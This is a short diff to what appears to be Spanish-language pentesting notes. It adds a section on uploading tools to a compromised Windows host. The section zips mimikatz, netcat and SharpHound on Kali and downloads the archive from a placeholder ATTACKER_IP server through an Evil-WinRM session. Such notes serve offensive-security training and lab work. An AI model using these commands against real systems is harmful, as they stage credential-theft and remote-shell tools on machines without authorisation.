@@ -32,3 +32,20 @@ Get-Process | Where-Object { $_.Name -like "*<process>*" } | Stop-Process -Force
 
 Get-Process | ? { $_.Path -like "*<process>*" }
 ```
+#### Subir tools
+
+✅ Recomendación práctica.
+
+En Kali:
+
+```bash
+
+zip -r tools.zip mimikatz.exe nc.exe SharpHound.ps1 ...
+
+```
+En Evil-WinRM:
+
+```bash
+iwr -uri http://ATTACKER_IP:8000/tools.zip -Outfile tools.zip
+Expand-Archive tools.zip -DestinationPath .
+```
